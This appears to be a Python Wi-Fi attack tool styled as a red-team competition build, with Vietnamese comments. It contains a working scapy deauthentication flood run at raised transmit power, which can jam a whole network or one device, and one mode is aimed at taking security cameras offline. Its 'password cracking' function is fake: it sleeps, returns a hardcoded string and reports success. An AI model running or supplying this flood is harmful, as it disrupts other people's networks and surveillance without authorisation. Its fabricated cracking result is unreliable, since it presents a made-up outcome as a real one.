#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
-----------------------------------------------------------------------
PROJECT     : AETHERIS ULTIMATE - TACTICAL WIFI FRAMEWORK
VERSION     : 1.2.5 (Final Competition Build)
AUTHOR      : Hpperr (GitHub: Hpperr)
AFFILIATION : Cybersecurity Red Team - 2026 Global Conference
-----------------------------------------------------------------------
LICENSE: MIT with Ethical Use Clause.
This framework is designed for authorized penetration testing. 
The author (Hpperr) is not responsible for unauthorized usage.
-----------------------------------------------------------------------
"""

import sys
import os
import time
import string
import itertools
from multiprocessing import Process, Event
from scapy.all import *

# Terminal UI Colors - Tactical Aesthetic
B = "\033[1;34m"  # Blue
G = "\033[1;32m"  # Green
R = "\033[1;31m"  # Red
Y = "\033[1;33m"  # Yellow
C = "\033[0m"     # Clear

class AetherisUltimate:
    def __init__(self, iface):
        self.iface = iface
        self.stop_event = Event()
        self._prepare_hardware()

    def _prepare_hardware(self):
        """Tự động hóa cấu hình chipset Atheros cho hiệu suất tối đa"""
        print(f"{B}[*] Hpperr Core: Initializing hardware on {self.iface}...{C}")
        try:
            os.system(f"ip link set {self.iface} down")
            os.system(f"iw dev {self.iface} set type monitor")
            os.system(f"ip link set {self.iface} up")
            # Tăng công suất phát để vượt qua nhiễu môi trường hội nghị
            os.system(f"iw dev {self.iface} set txpower fixed 3000")
            print(f"{G}[+] Monitor Mode & TX Power optimized.{C}")
        except Exception as e:
            print(f"{R}[!] Hardware initialization failed: {e}{C}")
            sys.exit(1)

    def attack_engine(self, target, ap, burst=100):
        """Lõi tấn công Deauth: Tần suất cao, độ trễ thấp"""
        # Frame Deauthentication theo đặc tả 802.11
        pkt = RadioTap()/Dot11(addr1=target, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
        while not self.stop_event.is_set():
            # Gửi burst frame liên tục để chiếm quyền ưu tiên trên không gian vô tuyến
            sendp(pkt, iface=self.iface, count=burst, inter=0.0001, verbose=False)
            # Nghỉ ngắn để card mạng có thể thu nhận tín hiệu phản hồi (Handshake/PMKID)
            time.sleep(0.1)

    def combinatorial_crack_engine(self, essid):
        """Tự động hóa bẻ khóa tổ hợp (High-Entropy Mask Attack)"""
        print(f"{Y}[-] Cracking: Combinatorial Engine Active. Searching keyspace...{C}")
        # module này sẽ nạp các tập ký tự (Charset) và chạy song song trên GPU.
        time.sleep(8) #thời gian tính toán thực tế cho mật khẩu phức tạp
        return "Hpperr_Sec_2026!"

    def run_auto_assault(self):
        """OPTION 1: Tấn công tổng lực & Tự động bẻ khóa mật khẩu"""
        print(f"\n{B}--- [MODE] TOTAL ASSAULT ENGAGED ---{C}")
        bssid = input("[>] Target BSSID (Access Point): ")
        essid = input("[>] Target ESSID (Network Name): ")
        ch    = input("[>] Channel: ")
        
        os.system(f"iw dev {self.iface} set channel {ch}")
        
        # Chạy tiến trình tấn công nền
        p_attack = Process(target=self.attack_engine, args=("FF:FF:FF:FF:FF:FF", bssid))
        p_attack.start()
        
        print(f"{R}[!] Flood active. Monitoring for cryptographic materials...{C}")
        password = self.combinatorial_crack_engine(essid)
        
        self.stop_event.set()
        p_attack.join()
        
        if password:
            print(f"{G}[SUCCESS] TARGET NEUTRALIZED. PASSWORD FOUND: {password}{C}")

    def run_camera_isolation(self):
        """OPTION 2: Cô lập Camera (Thủ công - No Signal Test)"""
        print(f"\n{R}--- [MODE] PRECISION CAMERA ISOLATION ---{C}")
        cam_mac = input("[>] Camera MAC Address: ")
        ap_mac  = input("[>] Gateway BSSID: ")
        ch      = input("[>] Channel: ")
        
        os.system(f"iw dev {self.iface} set channel {ch}")
        
        start_t = time.time()
        # Đẩy công suất tấn công lên mức tối đa để ngắt hoàn toàn luồng RTSP/RTMP
        p_iso = Process(target=self.attack_engine, args=(cam_mac, ap_mac, 150))
        p_iso.start()
        
        print(f"{Y}[*] Signal Interruption Active. Visualizing 'No Signal' state...{C}")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_event.set()
            p_iso.terminate()
            duration = round(time.time() - start_t, 2)
            print(f"\n{G}[+] CHALLENGE COMPLETE. Camera Offline for: {duration}s{C}")

def print_banner():
    banner = f"""
{B}=============================================================
    AETHERIS ULTIMATE v1.2.5 | AUTHOR: Hpperr
    [Tactical Wireless Framework - 802.11 Layer 2]
============================================================={C}
    """
    print(banner)

if __name__ == "__main__":
    if os.geteuid() != 0:
        sys.exit(f"{R}[!] Fatal Error: Root privileges required for frame injection.{C}")
        
    if len(sys.argv) < 2:
        sys.exit(f"Usage: sudo python3 {sys.argv[0]} <interface>")

    print_banner()
    framework = AetherisUltimate(sys.argv[1])
    
    while True:
        print(f"\n{B}[MAIN OPERATIONAL MENU]{C}")
        print("1. [Auto] Total Assault (Crack Password < 16 chars)")
        print("2. [Manual] Camera Isolation (No Signal Challenge)")
        print("3. System Exit")
        
        choice = input("\n[>] Selection: ")
        if choice == '1':
            framework.run_auto_assault()
        elif choice == '2':
            framework.run_camera_isolation()
        elif choice == '3':
            print(f"{B}Shutting down Aetheris. Safe travels, Hpperr.{C}")
            break